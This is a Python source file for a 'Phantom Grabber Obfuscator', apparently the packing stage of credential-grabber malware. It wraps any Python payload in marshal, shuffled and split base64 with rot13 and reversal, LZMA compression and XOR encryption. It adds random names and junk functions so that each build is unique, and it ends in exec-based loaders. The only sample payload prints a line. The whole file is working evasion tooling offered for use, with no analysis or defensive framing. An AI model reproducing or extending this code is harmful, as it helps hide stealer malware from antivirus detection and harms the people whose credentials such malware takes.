# Phantom Grabber Obfuscator — polymorphic per-build
# Multi-layer obfuscation: marshal → split/shuffle → compress → XOR encrypt
# Every build produces unique output due to random variable names, key material,
# split points, dead code, and string transformations.

import marshal
import base64
import lzma
import zlib
import codecs
import random
import string
import os
import logging

logger = logging.getLogger("PhantomOBF")


class PhantomOBF:
    """Polymorphic Python obfuscator. Each instantiation produces a unique build."""

    def __init__(self, code: str, outputpath: str):
        self.code = code.encode("utf-8")
        self.outpath = outputpath
        self.varlen = 3
        self.vars: dict[str, str] = {}
        self.xor_key = os.urandom(random.randint(16, 32))

        logger.info(f"PhantomOBF initializing — target: {outputpath}")
        self.marshal()
        self.layer_1_split_and_shuffle()
        self.layer_2_compress_and_wrap()
        self.layer_3_string_encrypt()
        self.finalize()
        logger.info("Obfuscation complete.")

    def generate(self, name: str) -> str:
        """Generate a unique random variable name. Each call for the same logical
        name returns the same random identifier (cached). Names are 8-20 chars,
        using underscores and ASCII letters to form valid Python identifiers."""
        if name in self.vars:
            return self.vars[name]

        length = random.randint(8, 20)
        # Start with underscore or letter
        first = random.choice(string.ascii_letters + "_")
        rest_chars = string.ascii_letters + string.digits + "_"
        rest = "".join(random.choices(rest_chars, k=length - 1))
        varname = first + rest

        # Ensure uniqueness
        existing = set(self.vars.values())
        while varname in existing or varname in dir(__builtins__):
            length = random.randint(8, 20)
            first = random.choice(string.ascii_letters + "_")
            rest = "".join(random.choices(rest_chars, k=length - 1))
            varname = first + rest

        self.vars[name] = varname
        return varname

    def encrypt_string(self, s: str) -> tuple[str, str]:
        """XOR encrypt a string with the per-build key, then base64 encode.
        Returns (encrypted_b64, key_b64) as string literals."""
        data = s.encode("utf-8")
        encrypted = bytes(b ^ self.xor_key[i % len(self.xor_key)] for i, b in enumerate(data))
        enc_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(self.xor_key).decode("ascii")
        return enc_b64, key_b64

    def _generate_dead_code(self) -> str:
        """Generate 25-40 junk functions with random signatures that do nothing meaningful."""
        lines = []
        num_funcs = random.randint(25, 40)

        for i in range(num_funcs):
            fname = self.generate(f"__dead_{i}")
            num_params = random.randint(0, 5)
            params = ", ".join(
                "p" + "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 5)))
                for _ in range(num_params)
            )

            body_lines = []
            num_stmts = random.randint(2, 8)
            for _ in range(num_stmts):
                stmt_type = random.choice(["assign", "loop", "cond", "pass"])
                vname = "v" + "".join(random.choices(string.ascii_lowercase, k=4))
                match stmt_type:
                    case "assign":
                        val = random.choice([
                            str(random.randint(-10000, 10000)),
                            f'"{_random_string(random.randint(4, 12))}"',
                            f"[{', '.join(str(random.randint(0, 99)) for _ in range(random.randint(1, 5)))}]",
                            "None", "True", "False",
                        ])
                        body_lines.append(f"    {vname} = {val}")
                    case "loop":
                        body_lines.append(f"    for {vname} in range({random.randint(1, 5)}):")
                        body_lines.append(f"        _ = {vname} * {random.randint(1, 99)}")
                    case "cond":
                        body_lines.append(f"    if {random.randint(0, 1)}:")
                        body_lines.append(f"        {vname} = {random.randint(0, 999)}")
                    case "pass":
                        body_lines.append("    pass")

            # Always return something
            ret_val = random.choice([
                str(random.randint(0, 255)),
                "None",
                f'"{_random_string(random.randint(3, 8))}"',
            ])
            body_lines.append(f"    return {ret_val}")

            func_code = f"def {fname}({params}):\n" + "\n".join(body_lines)
            lines.append(func_code)

        return "\n\n".join(lines)

    def _split_string(self, s: str, num_parts: int = 0) -> list[str]:
        """Split a string into 3-6 random-length parts."""
        if num_parts == 0:
            num_parts = random.randint(3, 6)
        if len(s) < num_parts:
            return [s]

        cut_points = sorted(random.sample(range(1, len(s)), min(num_parts - 1, len(s) - 1)))
        parts = []
        prev = 0
        for cp in cut_points:
            parts.append(s[prev:cp])
            prev = cp
        parts.append(s[prev:])
        return parts

    def marshal(self) -> None:
        """Compile source to code object and marshal it."""
        logger.info("  Layer 0: Marshaling bytecode...")
        code_obj = compile(self.code, "<phantom>", "exec")
        self.code = marshal.dumps(code_obj)

    def layer_1_split_and_shuffle(self) -> None:
        """Base64 the marshaled bytes, split into 4-6 parts with transformations,
        assign to shuffled variables, reconstruct and exec."""
        logger.info("  Layer 1: Split and shuffle...")
        b64_data = base64.b64encode(self.code).decode("ascii")

        num_parts = random.randint(4, 6)
        parts = self._split_string(b64_data, num_parts)

        # Apply transformations to random parts
        rot13_idx = random.randint(0, len(parts) - 1)
        reverse_idx = random.randint(0, len(parts) - 1)
        while reverse_idx == rot13_idx and len(parts) > 1:
            reverse_idx = random.randint(0, len(parts) - 1)

        transform_info = []  # (var_name, value_expr, is_rot13, is_reversed, original_index)
        for i, part in enumerate(parts):
            var = self.generate(f"part_{i}")
            if i == rot13_idx:
                encoded_part = codecs.encode(part, "rot_13")
                transform_info.append((var, repr(encoded_part), True, False, i))
            elif i == reverse_idx:
                reversed_part = part[::-1]
                transform_info.append((var, repr(reversed_part), False, True, i))
            else:
                transform_info.append((var, repr(part), False, False, i))

        # Shuffle assignment order
        shuffled = list(transform_info)
        random.shuffle(shuffled)

        # Generate reconstruction code
        lines = []

        # Dead code at top
        dead_code = self._generate_dead_code()
        lines.append(dead_code)
        lines.append("")

        # Shuffled assignments
        for var, val_expr, is_rot13, is_reversed, orig_idx in shuffled:
            lines.append(f"{var} = {val_expr}")

        # Reconstruction
        reconstruct_var = self.generate("reconstructed")
        concat_parts = []
        for var, val_expr, is_rot13, is_reversed, orig_idx in transform_info:
            if is_rot13:
                concat_parts.append(
                    f"__import__('codecs').decode({var}, 'rot_13')"
                )
            elif is_reversed:
                concat_parts.append(f"{var}[::-1]")
            else:
                concat_parts.append(var)

        # Join in original order
        ordered_parts = sorted(
            zip(transform_info, concat_parts),
            key=lambda x: x[0][4]
        )
        ordered_exprs = [expr for _, expr in ordered_parts]

        lines.append(f"{reconstruct_var} = " + " + ".join(ordered_exprs))

        # Import and exec
        exec_var = self.generate("executor")
        marshal_var = self.generate("payload")
        b64_mod = self.generate("b64mod")

        lines.append(f"{b64_mod} = __import__('base64')")
        lines.append(f"{marshal_var} = __import__('marshal').loads({b64_mod}.b64decode({reconstruct_var}))")

        # Wrap in try/except with dummy handler for control flow obfuscation
        dummy_exc_var = self.generate("exc_dummy")
        lines.append("try:")
        lines.append(f"    __import__('builtins').exec({marshal_var})")
        lines.append(f"except SystemExit:")
        lines.append(f"    raise")
        lines.append(f"except BaseException as {dummy_exc_var}:")
        lines.append(f"    __import__('builtins').exec({marshal_var})")

        self.code = "\n".join(lines).encode("utf-8")

    def layer_2_compress_and_wrap(self) -> None:
        """LZMA compress the layer 1 output, wrap in eval/compile/decompress chain."""
        logger.info("  Layer 2: Compress and wrap...")
        compressed = lzma.compress(self.code)
        comp_b64 = base64.b64encode(compressed).decode("ascii")

        # Split the b64 payload for added confusion
        parts = self._split_string(comp_b64, random.randint(3, 5))
        part_vars = []
        lines = []

        for i, part in enumerate(parts):
            v = self.generate(f"l2_chunk_{i}")
            lines.append(f"{v} = '{part}'")
            part_vars.append(v)

        concat_var = self.generate("l2_payload")
        lines.append(f"{concat_var} = " + " + ".join(part_vars))

        decomp_var = self.generate("l2_decompressed")
        lines.append(
            f"{decomp_var} = __import__('lzma').decompress("
            f"__import__('base64').b64decode({concat_var}))"
        )
        lines.append(
            f"exec(compile({decomp_var}, '<phantom>', 'exec'))"
        )

        self.code = "\n".join(lines).encode("utf-8")

    def layer_3_string_encrypt(self) -> None:
        """XOR encrypt the entire layer 2 output, output as bytes that get
        XOR-decrypted and exec'd at runtime."""
        logger.info("  Layer 3: XOR string encryption...")
        payload = self.code
        key = self.xor_key

        encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(payload))

        key_b64 = base64.b64encode(key).decode("ascii")
        data_b64 = base64.b64encode(encrypted).decode("ascii")

        # Split both key and data b64 strings
        data_parts = self._split_string(data_b64, random.randint(3, 5))
        key_parts = self._split_string(key_b64, random.randint(2, 3))

        lines = ["# Phantom Grabber Obfuscator — polymorphic per-build", ""]

        # More dead code
        for i in range(random.randint(3, 8)):
            fname = self.generate(f"__top_dead_{i}")
            rval = random.randint(0, 0xFFFFFF)
            lines.append(f"def {fname}(): return {rval}")
        lines.append("")

        # Key variable
        key_var = self.generate("xor_key")
        kp_vars = []
        for i, kp in enumerate(key_parts):
            kv = self.generate(f"kp_{i}")
            lines.append(f"{kv} = '{kp}'")
            kp_vars.append(kv)
        lines.append(f"{key_var} = __import__('base64').b64decode(" + " + ".join(kp_vars) + ")")

        # Data variable
        data_var = self.generate("xor_data")
        dp_vars = []
        for i, dp in enumerate(data_parts):
            dv = self.generate(f"dp_{i}")
            lines.append(f"{dv} = '{dp}'")
            dp_vars.append(dv)
        lines.append(f"{data_var} = __import__('base64').b64decode(" + " + ".join(dp_vars) + ")")

        # XOR decrypt function
        decrypt_func = self.generate("xor_decrypt")
        param_d = self.generate("param_data")
        param_k = self.generate("param_key")
        lines.append(
            f"def {decrypt_func}({param_d}, {param_k}):\n"
            f"    return bytes({param_d}[_i] ^ {param_k}[_i % len({param_k})] "
            f"for _i in range(len({param_d})))"
        )

        # Decrypt and exec
        result_var = self.generate("decrypted")
        lines.append(f"{result_var} = {decrypt_func}({data_var}, {key_var})")
        lines.append(f"exec(compile({result_var}, '<phantom>', 'exec'))")

        self.code = "\n".join(lines).encode("utf-8")

    def finalize(self) -> None:
        """Write the final obfuscated code to the output file."""
        logger.info(f"  Finalizing: writing to {self.outpath}")
        with open(self.outpath, "w", encoding="utf-8") as f:
            f.write(self.code.decode("utf-8"))
        logger.info(f"  Output size: {len(self.code)} bytes")


def _random_string(length: int) -> str:
    """Generate a random alphanumeric string."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


if __name__ == "__main__":
    # Quick test: obfuscate a simple script
    test_code = 'print("Phantom Grabber test payload")\n'
    PhantomOBF(test_code, "test_obfuscated.py")
    print("Test obfuscation written to test_obfuscated.py")
